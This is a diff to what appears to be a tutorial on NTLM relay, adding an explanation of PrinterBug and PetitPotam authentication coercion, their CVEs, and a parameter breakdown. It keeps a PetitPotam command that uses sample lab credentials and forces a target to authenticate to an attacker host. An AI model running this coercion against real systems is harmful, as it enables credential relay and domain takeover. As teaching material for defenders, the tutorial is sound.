@@ -153,7 +153,15 @@ Please note that if the webclient is installed but not running, there are some t
 
 For our next step, how can we force an authentication over HTTP?
 
-An attacker can try to coerce client authentication with RPC calls, primarily abusing the printer spool with “Printerbug” or abusing file encryption with “Petit Potam” tool.
+An attacker can try to coerce client authentication with RPC calls, by using some techniques that started to be relevant in 2018. The first issue to become widely used was called “PrinterBug”: it was an authenticated method (i.e., an attacker needs to already have domain credentials) for getting a server running the Print Spooler service to initiate an NTLMv2 authentication session (using its Machine Account credentials) with a server of the attacker's choosing. 
+
+In 2021, the PetitPotam tool was released, utilizing a similar vulnerability in the service MS-EFSRPC (Encrypting File System Remote Protocol). Please note that the researchers also found two vulnerabilites (CVE-2021-36943 AND CVE-2022-26925) that allowed unauthenticated coercion. This meant that an attacker without any credentials could force a vulnerable server to connect to the relay server. To make matters worse, Domain Controllers were vulnerable to the unauthenticated attack by default. As you can imagine, the un-authenticated version of the attack has been quickly patched, but still this kind of attack is quite relevant in the authenticated version.
+This is an example usage, let me describe the input parameters:
+- the username ("victim"),
+- the domain
+- the known password,
+- the server to which initiate an NTLMv2 authentication session ("attacker@80/aaa")
+- the IP address of the victim to attack
 ```
 python3 PetitPotam.py -u victim -d ntlmlab.local -p Qwerty123 attacker@80/aaa 10.0.0.2
 ```
